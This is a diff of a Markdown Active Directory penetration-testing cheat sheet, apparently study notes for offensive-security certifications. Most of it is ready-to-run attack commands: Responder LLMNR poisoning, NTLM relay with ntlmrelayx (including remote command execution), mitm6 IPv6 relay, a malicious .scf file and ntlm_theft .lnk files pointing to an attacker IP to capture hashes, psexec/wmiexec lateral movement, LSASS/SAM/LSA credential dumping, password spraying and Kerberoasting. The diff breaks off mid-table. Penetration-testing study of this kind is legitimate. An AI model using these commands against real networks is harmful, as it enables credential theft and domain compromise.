@@ -10,55 +10,63 @@
     - `1.1.2` ICMP range sweep
   - `1.2` **Routed-network discovery**
     - `1.2.1` **Nmap**
-      - `1.2.1.1` TCP SYN and ACK probes
-      - `1.2.1.2` UDP service probes
-      - `1.2.1.3` Host-only sweep
-      - `1.2.1.4` Aggressive all-port scan
-      - `1.2.1.5` SYN stealth with default scripts
-- `2` **Initial Attacks for Active Directory**
-  - `2.1` **LLMNR Poisoning**
-    - `2.1.1` Responder hash capture
-    - `2.1.2` Hashcat NTLMv2 cracking
-  - `2.2` **SMB Relay Attack**
-    - `2.2.1` Enumerate SMB signing
-    - `2.2.2` Responder relay configuration
-    - `2.2.3` ntlmrelayx.py
-- `3` **Gaining Shell Access**
-  - `3.1` **Impacket lateral movement**
-    - `3.1.1` psexec
-    - `3.1.2` wmiexec
-    - `3.1.3` smbexec
-  - `3.2` **Metasploit psexec**
-- `4` **IPv6 Attacks**
-  - `4.1` mitm6 + ntlmrelayx.py
-- `5` **Post-Compromise Enumeration (Active Directory)**
+      - `1.2.1.1` TCP SYN probes
+      - `1.2.1.2` TCP ACK probes
+      - `1.2.1.3` UDP service probes
+      - `1.2.1.4` Host-only sweep
+- `2` **Port Scanning & Service Enumeration**
+  - `2.1` **Nmap**
+    - `2.1.1` Aggressive all-port scan
+    - `2.1.2` SYN stealth with default scripts
+- `3` **Initial Attack Vectors**
+  - `3.1` **LLMNR/NBT-NS Poisoning**
+    - `3.1.1` Responder hash capture
+    - `3.1.2` Cracking NTLMv2 hashes
+  - `3.2` **SMB Relay Attack**
+    - `3.2.1` Enumerate SMB signing
+    - `3.2.2` Responder relay configuration
+    - `3.2.3` impacket-ntlmrelayx
+  - `3.3` **IPv6 mitm6 Attack**
+    - `3.3.1` mitm6
+    - `3.3.2` impacket-ntlmrelayx (IPv6 relay)
+  - `3.4` **SMB Share File-Based Attacks**
+    - `3.4.1` Upload .scf / .lnk files
+- `4` **Lateral Movement & Shell Access**
+  - `4.1` **Impacket**
+    - `4.1.1` impacket-psexec
+    - `4.1.2` impacket-wmiexec
+    - `4.1.3` impacket-smbexec
+  - `4.2` **Metasploit**
+    - `4.2.1` psexec module
+  - `4.3` **RDP**
+    - `4.3.1` xfreerdp
+- `5` **Active Directory Enumeration**
   - `5.1` ldapdomaindump
   - `5.2` BloodHound
   - `5.3` PlumHound
-- `6` **Post-Compromise Attacks (Active Directory)**
-  - `6.1` **Pass the Password / Pass-the-Hash**
-    - `6.1.1` crackmapexec credential validation
-    - `6.1.2` secretsdump.py
-    - `6.1.3` crackmapexec modules
-  - `6.2` **Kerberoasting**
-    - `6.2.1` GetUserSPNs.py
-    - `6.2.2` Hashcat TGS cracking
-  - `6.3` **Token Impersonation**
-  - `6.4` **Credential Dumping**
-    - `6.4.1` Mimikatz
-    - `6.4.2` LSASS dump via Task Manager
-    - `6.4.3` LSASS dump via procdump
-    - `6.4.4` LSASS dump via crackmapexec
-  - `6.5` **User and Group Manipulation**
+  - `5.4` impacket-samrdump
+  - `5.5` impacket-lookupsid
+- `6` **Credential Attacks**
+  - `6.1` **crackmapexec Suite**
+    - `6.1.1` Credential validation
+    - `6.1.2` SAM / LSA dump
+    - `6.1.3` LSASS dump (lsassy)
+    - `6.1.4` Password spraying
+    - `6.1.5` Local authentication & cmedb
+  - `6.2` **impacket-secretsdump**
+  - `6.3` **Kerberoasting**
+    - `6.3.1` impacket-GetUserSPNs
+    - `6.3.2` Cracking TGS hashes
+  - `6.4` **Token Impersonation**
+  - `6.5` **Credential Dumping**
+    - `6.5.1` Mimikatz
+    - `6.5.2` LSASS dump (Task Manager)
+    - `6.5.3` LSASS dump (procdump)
   - `6.6` **GPP / cPassword Attacks**
-- `7` **Domain Dominance**
-  - `7.1` Dumping NTDS.dit
-  - `7.2` Golden Ticket
-- `8` **Additional Active Directory Attacks**
-  - `8.1` **ZeroLogon (CVE-2020-1472)**
-  - `8.2` **PrintNightmare (CVE-2021-1675)**
-    - `8.2.1` RCE — Remote Code Execution
-    - `8.2.2` LPE — Local Privilege Escalation
+- `7` **Persistence & Domain Dominance**
+  - `7.1` **User and Group Manipulation**
+  - `7.2` Dumping NTDS.dit
+  - `7.3` Golden Ticket Attack
 
 ## 1. Host Discovery
 
@@ -135,10 +143,10 @@ fping -a -g <IP/MASK> 2>/dev/null
 
 #### 1.2.1 Nmap
 
-##### 1.2.1.1 TCP SYN and ACK probes <sup>· CPTS</sup>
+##### 1.2.1.1 TCP SYN probes <sup>· CPTS</sup>
 
 ```bash
-sudo nmap -sn -PS22,80,443 -PA80,443 <IP/MASK>
+sudo nmap -sn -PS22,80,443 <IP/MASK>
 ```
 
 <details>
@@ -146,19 +154,40 @@ sudo nmap -sn -PS22,80,443 -PA80,443 <IP/MASK>
 
 **Description**
 
-- Identifies hosts that respond to selected TCP SYN or ACK probes.
-- Useful when ICMP echo requests are filtered.
+- Sends TCP SYN packets to the specified ports to elicit a response from live hosts.
+- A SYN-ACK or RST response indicates the host is up.
 
 **Parameters**
 
 - `-sn` — Performs host discovery without a port scan.
 - `-PS22,80,443` — Sends TCP SYN probes to the listed ports.
+- `<IP/MASK>` — Target host or CIDR range.
+
+</details>
+
+##### 1.2.1.2 TCP ACK probes <sup>· CPTS</sup>
+
+```bash
+sudo nmap -sn -PA80,443 <IP/MASK>
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Sends TCP ACK packets to the specified ports, prompting a RST response from live hosts.
+- Often bypasses stateless firewalls that filter SYN but not ACK packets.
+
+**Parameters**
+
+- `-sn` — Performs host discovery without a port scan.
 - `-PA80,443` — Sends TCP ACK probes to the listed ports.
 - `<IP/MASK>` — Target host or CIDR range.
 
 </details>
 
-##### 1.2.1.2 UDP service probes <sup>· CPTS</sup>
+##### 1.2.1.3 UDP service probes <sup>· CPTS</sup>
 
 ```bash
 sudo nmap -sn -PU53,123,161 <IP/MASK>
@@ -171,6 +200,7 @@ sudo nmap -sn -PU53,123,161 <IP/MASK>
 
 - Uses UDP probes to elicit responses from common infrastructure services.
 - Helps identify hosts that do not answer ICMP or TCP discovery probes.
+- Port 53 (DNS), 123 (NTP — Network Time Protocol), and 161 (SNMP — Simple Network Management Protocol) are commonly open on infrastructure devices.
 
 **Parameters**
 
@@ -180,7 +210,7 @@ sudo nmap -sn -PU53,123,161 <IP/MASK>
 
 </details>
 
-##### 1.2.1.3 Host-only sweep <sup>· CPTS</sup>
+##### 1.2.1.4 Host-only sweep <sup>· CPTS</sup>
 
 ```bash
 nmap -sn -n <IP/MASK>
@@ -202,7 +232,11 @@ nmap -sn -n <IP/MASK>
 
 </details>
 
-##### 1.2.1.4 Aggressive all-port scan <sup>· PJPT</sup>
+## 2. Port Scanning & Service Enumeration
+
+### 2.1 Nmap
+
+#### 2.1.1 Aggressive all-port scan <sup>· PJPT</sup>
 
 ```bash
 nmap -T4 -p- -A <IP/MASK>
@@ -225,7 +259,7 @@ nmap -T4 -p- -A <IP/MASK>
 
 </details>
 
-##### 1.2.1.5 SYN stealth with default scripts <sup>· PJPT</sup>
+#### 2.1.2 SYN stealth with default scripts <sup>· PJPT</sup>
 
 ```bash
 nmap -T4 -p- -sS -sC <IP/MASK>
@@ -249,11 +283,11 @@ nmap -T4 -p- -sS -sC <IP/MASK>
 
 </details>
 
-## 2. Initial Attacks for Active Directory
+## 3. Initial Attack Vectors
 
-### 2.1 LLMNR Poisoning
+### 3.1 LLMNR/NBT-NS Poisoning
 
-#### 2.1.1 Responder hash capture <sup>· PJPT</sup>
+#### 3.1.1 Responder hash capture <sup>· PJPT</sup>
 
 ```bash
 sudo responder -I <INTERFACE> -dP
@@ -270,15 +304,23 @@ sudo responder -I <INTERFACE> -dP
 **Parameters**
 
 - `-I <INTERFACE>` — Network interface to listen on (e.g. tun0).
-- `-d` — Doesn't answer to NetBIOS domain suffix queries (DWITH option).
-- `-P` — Doesn't answer to Proxy Auth requests.
+- `-d` — Suppresses answering NetBIOS domain suffix queries.
+- `-P` — Suppresses answering Proxy Auth requests.
 
 </details>
 
-#### 2.1.2 Hashcat NTLMv2 cracking <sup>· PJPT</sup>
+#### 3.1.2 Cracking NTLMv2 hashes <sup>· PJPT</sup>
+
+**With hashcat:**
 
 ```bash
-hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 5600 <HASH_FILE> /usr/share/wordlists/rockyou.txt
+```
+
+**With John the Ripper:**
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt <HASH_FILE>
 ```
 
 <details>
@@ -287,19 +329,20 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 **Description**
 
 - Cracks captured NTLMv2 hashes offline using a wordlist.
-- After capturing a hash with Responder, copy it to a file and run hashcat against it.
+- After capturing a hash with Responder, copy it to a file and crack it.
+- Useful when hashcat is unavailable or memory-constrained — John the Ripper detects the NTLMv2 format automatically.
 
 **Parameters**
 
-- `-m 5600` — Hash type for NetNTLMv2.
-- `hash.txt` — File containing the captured hash.
-- `/usr/share/wordlists/rockyou.txt` — Wordlist for dictionary attack.
+- `-m 5600` — Hash type for NetNTLMv2 (hashcat).
+- `--wordlist=<WORDLIST>` — Wordlist for dictionary attack (John).
+- `<HASH_FILE>` — File containing the captured NTLMv2 hash.
 
 </details>
 
-### 2.2 SMB Relay Attack
+### 3.2 SMB Relay Attack
 
-#### 2.2.1 Enumerate SMB signing <sup>· PJPT</sup>
+#### 3.2.1 Enumerate SMB signing <sup>· PJPT</sup>
 
 ```bash
 nmap -p445 <IP/MASK> --script=smb2-security-mode
@@ -311,7 +354,8 @@ nmap -p445 <IP/MASK> --script=smb2-security-mode
 **Description**
 
 - Checks whether SMB message signing is required on discovered hosts.
-- The SMB relay attack works only when SMB signing is disabled.
+- The SMB relay attack works only when SMB signing is disabled or not required.
+- If signing is `enabled and required`, that host cannot be used as a relay target.
 
 **Parameters**
 
@@ -321,7 +365,7 @@ nmap -p445 <IP/MASK> --script=smb2-security-mode
 
 </details>
 
-#### 2.2.2 Responder relay configuration <sup>· PJPT</sup>
+#### 3.2.2 Responder relay configuration <sup>· PJPT</sup>
 
 Edit the Responder configuration to disable SMB and HTTP services:
 
@@ -352,24 +396,24 @@ sudo responder -I <INTERFACE> -dP
 
 </details>
 
-#### 2.2.3 ntlmrelayx.py <sup>· PJPT</sup>
+#### 3.2.3 impacket-ntlmrelayx <sup>· PJPT</sup>
 
 **Dump password hashes:**
 
 ```bash
-sudo ntlmrelayx.py -tf targets.txt -smb2support
+sudo impacket-ntlmrelayx -tf <TARGETS_FILE> -smb2support
 ```
 
 **Create an interactive SMB shell:**
 
 ```bash
-sudo ntlmrelayx.py -tf targets.txt -smb2support -i
+sudo impacket-ntlmrelayx -tf <TARGETS_FILE> -smb2support -i
 ```
 
 **Execute a command on all relayed targets:**
 
 ```bash
-sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
+sudo impacket-ntlmrelayx -tf <TARGETS_FILE> -smb2support -c "whoami"
 ```
 
 <details>
@@ -382,35 +426,131 @@ sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
 
 **Parameters**
 
-- `-tf targets.txt` — File containing target IP addresses, one per line.
+- `-tf <TARGETS_FILE>` — File containing target IP addresses, one per line.
 - `-smb2support` — Enables SMBv2 support for the relay.
 - `-i` — Opens an interactive SMB shell after a successful relay.
 - `-c <COMMAND>` — Executes the given command on the relayed target.
 
 </details>
 
-## 3. Gaining Shell Access
+### 3.3 IPv6 mitm6 Attack
 
-### 3.1 Impacket lateral movement
+#### 3.3.1 mitm6 <sup>· PJPT</sup>
 
-#### 3.1.1 psexec <sup>· PJPT</sup>
+```bash
+sudo mitm6 -d <DOMAIN>
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- If IPv6 is enabled on the network but no DNS server for IPv6 exists, mitm6 can impersonate one.
+- Spoofs DHCPv6 and DNS replies to redirect WPAD traffic to the attacker's machine.
+- Must be run concurrently with impacket-ntlmrelayx (in a separate terminal) to relay captured authentication.
+
+**Parameters**
+
+- `-d <DOMAIN>` — The target Active Directory domain (e.g., `test.local`).
+
+</details>
+
+#### 3.3.2 impacket-ntlmrelayx (IPv6 relay) <sup>· PJPT</sup>
+
+```bash
+sudo impacket-ntlmrelayx -6 -t ldap://<DC_IP> -wh fakewpad.<DOMAIN> -l <LOOT_DIR>
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Relays authentication captured via mitm6 to LDAP(S) on the domain controller, enabling domain object manipulation.
+- Results are saved as HTML reports in the specified loot directory (e.g., `domain_computers.html`).
+- Use `ldaps://` for encrypted LDAP; `ldap://` works if signing is not enforced.
+- Requires mitm6 running concurrently in a separate terminal.
+
+**Parameters**
+
+- `-6` — Enables IPv6 mode.
+- `-t ldap://<DC_IP>` — Target domain controller over LDAP(S).
+- `-wh fakewpad.<DOMAIN>` — Spoofed WPAD hostname for the relay.
+- `-l <LOOT_DIR>` — Directory where enumerated domain information is saved.
+
+</details>
+
+### 3.4 SMB Share File-Based Attacks
+
+#### 3.4.1 Upload .scf / .lnk files <sup>· PJPT</sup>
+
+**Create a malicious .scf file:**
+
+```bash
+echo '[Shell]' > @pwn.scf
+echo 'Command=2' >> @pwn.scf
+echo 'IconFile=\\<ATTACKER_IP>\icon.ico' >> @pwn.scf
+echo '[Taskbar]' >> @pwn.scf
+echo 'Command=ToggleDesktop' >> @pwn.scf
+```
+
+**Generate .lnk files with ntlm_theft:**
+
+```bash
+git clone https://github.com/Greenwolf/ntlm_theft.git
+cd ntlm_theft
+python3 ntlm_theft.py -g lnk -s <ATTACKER_IP> -f pwn
+```
+
+**Upload to a writable SMB share:**
+
+```bash
+smbclient //<DC_IP>/"Share Name" -U <USERNAME> -W <DOMAIN> -m SMB3
+smb: \> put @pwn.scf
+smb: \> put pwn.lnk
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- If a writable SMB share is found, upload .scf or .lnk files that contain an icon path pointing to the attacker's SMB server.
+- When a user browses the share in Windows Explorer, their machine attempts to load the icon file, sending their NTLMv2 hash to the attacker.
+- Capture the hash with Responder running concurrently.
+
+**Parameters**
+
+- `//<DC_IP>/"Share Name"` — Target SMB share path (quote if share name contains spaces).
+- `-U <USERNAME>` — Username for SMB authentication.
+- `-W <DOMAIN>` — Domain or workgroup name.
+- `-m SMB3` — Force SMB3 protocol.
+
+</details>
+
+## 4. Lateral Movement & Shell Access
+
+### 4.1 Impacket
+
+#### 4.1.1 impacket-psexec <sup>· PJPT</sup>
 
 **For domain users:**
 
 ```bash
-psexec.py <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
+impacket-psexec <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
 ```
 
 **For local users:**
 
 ```bash
-psexec.py <USERNAME>:'<PASSWORD>'@<TARGET_IP>
+impacket-psexec <USERNAME>:'<PASSWORD>'@<TARGET_IP>
 ```
 
-**With local user and password hash:**
+**With password hash:**
 
 ```bash
-psexec.py Administrator@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
+impacket-psexec <LOCAL_ADMIN>@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
 ```
 
 <details>
@@ -426,14 +566,15 @@ psexec.py Administrator@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
 - `<DOMAIN>/<USERNAME>` — Domain-qualified username or `./<USERNAME>` for local accounts.
 - `'<PASSWORD>'` — User password (quote if it contains special characters).
 - `--hashes <LM_HASH>:<NTLM_HASH>` — Authenticates using NTLM hash instead of a password.
+- `<LOCAL_ADMIN>` — Local administrator account (default `Administrator` but may vary by language/build).
 - `<TARGET_IP>` — IP address of the target machine.
 
 </details>
 
-#### 3.1.2 wmiexec <sup>· PJPT</sup>
+#### 4.1.2 impacket-wmiexec <sup>· PJPT</sup>
 
 ```bash
-wmiexec.py Administrator@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
+impacket-wmiexec <LOCAL_ADMIN>@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
 ```
 
 <details>
@@ -446,15 +587,15 @@ wmiexec.py Administrator@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
 
 **Parameters**
 
-- `Administrator@<TARGET_IP>` — Username and target IP.
+- `<LOCAL_ADMIN>@<TARGET_IP>` — Username and target IP.
 - `--hashes <LM_HASH>:<NTLM_HASH>` — Authenticates using NTLM hash.
 
 </details>
 
-#### 3.1.3 smbexec <sup>· PJPT</sup>
+#### 4.1.3 impacket-smbexec <sup>· PJPT</sup>
 
 ```bash
-smbexec.py <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
+impacket-smbexec <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
 ```
 
 <details>
@@ -467,7 +608,9 @@ smbexec.py <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
 
 </details>
 
-### 3.2 Metasploit psexec <sup>· PJPT</sup>
+### 4.2 Metasploit
+
+#### 4.2.1 psexec module <sup>· PJPT</sup>
 
 ```
 use exploit/windows/smb/psexec
@@ -495,20 +638,20 @@ run
 
 </details>
 
-## 4. IPv6 Attacks
+### 4.3 RDP
 
-### 4.1 mitm6 + ntlmrelayx.py <sup>· PJPT</sup>
+#### 4.3.1 xfreerdp <sup>· PJPT</sup>
 
-**Start mitm6 for the target domain:**
+**For domain users:**
 
 ```bash
-sudo mitm6 -d <DOMAIN>
+xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:'<PASSWORD>' /d:<DOMAIN> /cert:ignore
 ```
 
-**Start ntlmrelayx.py for LDAP relay over IPv6:**
+**For local accounts:**
 
 ```bash
-ntlmrelayx.py -6 -t ldaps://<DC_IP> -wh fakewpad.<DOMAIN> -l <LOOT_DIR>
+xfreerdp /v:<TARGET_IP> /u:.\<USERNAME> /p:'<PASSWORD>' /cert:ignore
 ```
 
 <details>
@@ -516,22 +659,20 @@ ntlmrelayx.py -6 -t ldaps://<DC_IP> -wh fakewpad.<DOMAIN> -l <LOOT_DIR>
 
 **Description**
 
-- If IPv6 is enabled on the network but no DNS server for IPv6 exists, mitm6 can impersonate one.
-- mitm6 spoofs DHCPv6 and DNS replies to redirect WPAD traffic to the attacker.
-- ntlmrelayx.py relays captured authentication to LDAP(S), enabling domain object manipulation.
-- Results are saved as HTML reports in the specified loot directory (e.g., `domain_computers.html`).
+- Connects to a Windows host via Remote Desktop Protocol for graphical access.
+- Useful for running GUI-based tools (Task Manager, Mimikatz) on the target.
 
 **Parameters**
 
-- `-d <DOMAIN>` — The target Active Directory domain (e.g., `test.local`).
-- `-6` — Enables IPv6 mode in ntlmrelayx.py.
-- `-t ldaps://<DC_IP>` — Target domain controller over LDAPS.
-- `-wh fakewpad.<DOMAIN>` — Spoofed WPAD hostname for the relay.
-- `-l <LOOT_DIR>` — Directory where enumerated domain information is saved.
+- `/v:<TARGET_IP>` — Target IP address.
+- `/u:<USERNAME>` — Username for authentication. Use `.\<USERNAME>` for local accounts.
+- `/p:'<PASSWORD>'` — Password (quote if it contains special characters).
+- `/d:<DOMAIN>` — Domain name (omit for local accounts).
+- `/cert:ignore` — Ignores certificate validation errors.
 
 </details>
 
-## 5. Post-Compromise Enumeration (Active Directory)
+## 5. Active Directory Enumeration
 
 ### 5.1 ldapdomaindump <sup>· PJPT</sup>
 
@@ -539,10 +680,10 @@ ntlmrelayx.py -6 -t ldaps://<DC_IP> -wh fakewpad.<DOMAIN> -l <LOOT_DIR>
 sudo ldapdomaindump ldaps://<DC_IP> -u '<DOMAIN>\\<USERNAME>' -p <PASSWORD>
 ```
 
-After execution, open the generated HTML files:
+For output to a specific directory:
 
 ```bash
-firefox domain_*.html
+ldapdomaindump -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' <DC_IP> -o <OUTPUT_DIR>
 ```
 
 <details>
@@ -559,25 +700,37 @@ firefox domain_*.html
 - `ldaps://<DC_IP>` — Domain controller address over LDAPS.
 - `-u '<DOMAIN>\\<USERNAME>'` — Domain-qualified username.
 - `-p <PASSWORD>` — User password.
+- `-o <OUTPUT_DIR>` — Output directory for generated HTML/JSON files.
 
 </details>
 
 ### 5.2 BloodHound <sup>· PJPT</sup>
 
-**Collect data with bloodhound-python:**
+**Collect data with BloodHound-Python (v1.9.0):**
 
 ```bash
-sudo bloodhound-python -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -ns <DC_IP> -c all
+cd ~/Desktop/bloodhound-python
+source venv/bin/activate
+bloodhound-python \
+  -u '<USERNAME>' \
+  -p '<PASSWORD>' \
+  -d '<DOMAIN>' \
+  -ns '<DC_IP>' \
+  -c All \
+  --zip
 ```
 
-**Start the analysis platform:**
+**Start the analysis platform — BloodHound Legacy (v4.3.1) + Neo4j (v4.4.19):**
 
 ```bash
-sudo neo4j console
-sudo bloodhound
+sudo systemctl start docker.socket
+sudo systemctl start docker
+sudo docker start neo4j-bloodhound
+cd ~/Desktop/BloodHound-linux-arm64
+./BloodHound --no-sandbox --disable-gpu
 ```
 
-Drag and drop the generated JSON files into the BloodHound GUI.
+Drag and drop the generated JSON files (or ZIP) into the BloodHound GUI.
 
 <details>
 <summary>Details</summary>
@@ -585,23 +738,40 @@ Drag and drop the generated JSON files into the BloodHound GUI.
 **Description**
 
 - Maps Active Directory attack paths by collecting and analysing relationships between users, groups, computers, and permissions.
-- bloodhound-python collects data remotely without touching disk on the target.
+- BloodHound-Python v1.9.0 collects data remotely and was designed for the legacy BloodHound GUI (v4.3.1).
+- Neo4j v4.4.19 is the database backend recommended for legacy BloodHound.
 
-**Parameters**
+**bloodhound-python Parameters**
 
-- `-d <DOMAIN>` — Target AD domain.
-- `-u <USERNAME>` — Username for LDAP authentication.
-- `-p <PASSWORD>` — Password for LDAP authentication.
-- `-ns <DC_IP>` — Domain controller IP used for name resolution.
-- `-c all` — Collects all available data categories (sessions, ACLs, groups, trusts, etc.).
+- `-d '<DOMAIN>'` — Target AD domain.
+- `-u '<USERNAME>'` — Username for LDAP authentication.
+- `-p '<PASSWORD>'` — Password for LDAP authentication.
+- `-ns '<DC_IP>'` — Domain controller IP used for name resolution.
+- `-c All` — Collects all available data categories.
+- `--zip` — Outputs results as a single ZIP file for easier import.
 
 </details>
 
 ### 5.3 PlumHound <sup>· PJPT</sup>
 
+**PlumHound v1.7.8:**
+
 ```bash
-sudo python3 PlumHound.py --easy -p <NEO4J_PASSWORD>
-sudo python3 PlumHound.py -x tasks/default.tasks -p <NEO4J_PASSWORD>
+cd ~/Desktop/PlumHound
+source venv/bin/activate
+
+# Test database connectivity
+python PlumHound.py --easy \
+  -s bolt://127.0.0.1:7687 \
+  -u neo4j \
+  -p <NEO4J_PASSWORD>
+
+# Generate standard reports
+python PlumHound.py \
+  -x tasks/default.tasks \
+  -s bolt://127.0.0.1:7687 \
+  -u neo4j \
+  -p <NEO4J_PASSWORD>
 ```
 
 <details>
@@ -617,15 +787,61 @@ sudo python3 PlumHound.py -x tasks/default.tasks -p <NEO4J_PASSWORD>
 
 - `--easy` — Runs a simplified set of preconfigured queries.
 - `-x tasks/default.tasks` — Executes a custom task file.
+- `-s bolt://127.0.0.1:7687` — Neo4j Bolt connection string.
+- `-u neo4j` — Neo4j database username.
 - `-p <NEO4J_PASSWORD>` — Password for the Neo4j database.
 
 </details>
 
-## 6. Post-Compromise Attacks (Active Directory)
+### 5.4 impacket-samrdump <sup>· PJPT</sup>
 
-### 6.1 Pass the Password / Pass-the-Hash
+```bash
+impacket-samrdump <DOMAIN>/<USERNAME>:'<PASSWORD>'@<DC_IP>
+```
 
-#### 6.1.1 crackmapexec credential validation <sup>· PJPT</sup>
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Enumerates domain users and their attributes via the SAMR (Security Account Manager Remote) protocol.
+- A lightweight alternative to ldapdomaindump for a quick user listing with password policy details.
+- Requires standard domain credentials — no elevated privileges needed.
+
+**Parameters**
+
+- `<DOMAIN>/<USERNAME>:<PASSWORD>` — Domain credentials.
+- `<DC_IP>` — Domain controller IP address.
+
+</details>
+
+### 5.5 impacket-lookupsid <sup>· PJPT</sup>
+
+```bash
+impacket-lookupsid <DOMAIN>/<USERNAME>:'<PASSWORD>'@<DC_IP>
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Enumerates domain users and groups by brute-forcing Security Identifiers (SIDs) via the LSARPC protocol.
+- Also returns the domain SID, which is required for Golden Ticket attacks.
+- Requires standard domain credentials.
+
+**Parameters**
+
+- `<DOMAIN>/<USERNAME>:<PASSWORD>` — Domain credentials.
+- `<DC_IP>` — Domain controller IP address.
+
+</details>
+
+## 6. Credential Attacks
+
+### 6.1 crackmapexec Suite
+
+#### 6.1.1 Credential validation <sup>· PJPT</sup>
 
 **Validate credentials across the network via SMB:**
 
@@ -636,7 +852,7 @@ crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD>
 **Validate using a password hash:**
 
 ```bash
-crackmapexec smb <IP/MASK> -d <DOMAIN> -u administrator -H <NTLM_HASH>
+crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -H <NTLM_HASH>
 ```
 
 <details>
@@ -659,18 +875,116 @@ crackmapexec smb <IP/MASK> -d <DOMAIN> -u administrator -H <NTLM_HASH>
 
 </details>
 
-#### 6.1.2 secretsdump.py <sup>· PJPT</sup>
+#### 6.1.2 SAM / LSA dump <sup>· PJPT</sup>
+
+**Dump SAM hashes:**
+
+```bash
+crackmapexec smb <TARGET_IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --sam
+```
+
+**Dump LSA secrets:**
+
+```bash
+crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --lsa
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- `--sam` dumps local SAM hashes from the target and stores them in the cmedb database.
+- `--lsa` dumps LSA secrets including cached credentials and service account passwords (these are not stored in cmedb).
+- Both require local administrator privileges on the target.
+
+</details>
+
+#### 6.1.3 LSASS dump (lsassy) <sup>· PJPT</sup>
+
+```bash
+crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -M lsassy
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Extracts credentials from LSASS memory remotely through SMB using the lsassy module.
+- Dumped credentials are stored in the cmedb database for later retrieval.
+- Requires local administrator privileges on the target.
+
+</details>
+
+#### 6.1.4 Password spraying <sup>· PJPT</sup>
+
+**Spray a password against a list of users:**
+
+```bash
+crackmapexec smb <IP/MASK> -u <USERS_FILE> -p '<PASSWORD>' --continue-on-success
+```
+
+**Spray a password hash against a list of users:**
+
+```bash
+crackmapexec smb <IP/MASK> -u <USERS_FILE> -H <NTLM_HASH> --continue-on-success
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Tests a single password or hash against every user in a file, continuing even after finding a match.
+- Useful for discovering password reuse across domain accounts.
+- The `--continue-on-success` flag ensures all users are tested, not just the first match.
+
+**Parameters**
+
+- `-u <USERS_FILE>` — File containing a list of usernames, one per line.
+- `--continue-on-success` — Continues testing even after successful authentications.
+- `<PASSWORD>` — Password to spray (quote if it contains special characters).
+
+</details>
+
+#### 6.1.5 Local authentication & cmedb <sup>· PJPT</sup>
+
+**Test local credentials (non-domain):**
+
+```bash
+crackmapexec smb <IP/MASK> -u <USERNAME> -p <PASSWORD> --local-auth
+```
+
+**Access the crackmapexec database:**
+
+```bash
+cmedb
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- `--local-auth` authenticates to the local SAM of each target instead of the domain.
+- `cmedb` provides access to the crackmapexec database, which stores discovered hosts, credentials, and dumped SAM hashes from prior runs.
+- Use cmedb to review and export previously gathered credentials without re-scanning.
+
+</details>
+
+### 6.2 impacket-secretsdump <sup>· PJPT</sup>
 
 **Dump local hashes with credentials:**
 
 ```bash
-secretsdump.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
+impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
 ```
 
 **Dump local hashes with a password hash:**
 
 ```bash
-secretsdump.py administrator@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
+impacket-secretsdump <LOCAL_ADMIN>@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
 ```
 
 <details>
@@ -686,52 +1000,17 @@ secretsdump.py administrator@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
 - `<DOMAIN>/<USERNAME>` — Domain-qualified username.
 - `<PASSWORD>` — User password.
 - `--hashes <LM_HASH>:<NTLM_HASH>` — Authenticate using NTLM hash instead of password.
+- `<LOCAL_ADMIN>` — Local administrator account (default `Administrator` but may vary).
 - `<TARGET_IP>` — IP address of the target machine.
 
 </details>
 
-#### 6.1.3 crackmapexec modules <sup>· PJPT</sup>
+### 6.3 Kerberoasting
 
-**Dump credentials with the lsassy module:**
-
-```bash
-crackmapexec smb <IP/MASK> -d <DOMAIN> -u administrator -H <NTLM_HASH> --local-auth -M lsassy
-```
-
-**Access the crackmapexec database:**
+#### 6.3.1 impacket-GetUserSPNs <sup>· PJPT</sup>
 
 ```bash
-cmedb
-```
-
-<details>
-<summary>Details</summary>
-
-**Description**
-
-- crackmapexec modules extend its functionality with specialised attack and enumeration capabilities.
-- `lsassy` extracts credentials from LSASS memory remotely through SMB.
-- `cmedb` provides access to the crackmapexec database of discovered hosts and credentials.
-
-**Common Modules and Flags**
-
-| Flag | Description |
-|---|---|
-| `--local-auth` | Authenticate locally to each target (non-domain). |
-| `--sam` | Dump SAM hashes from target system. |
-| `--lsa` | Dump LSA secrets from target system. |
-| `--shares` | Enumerate shares and access. |
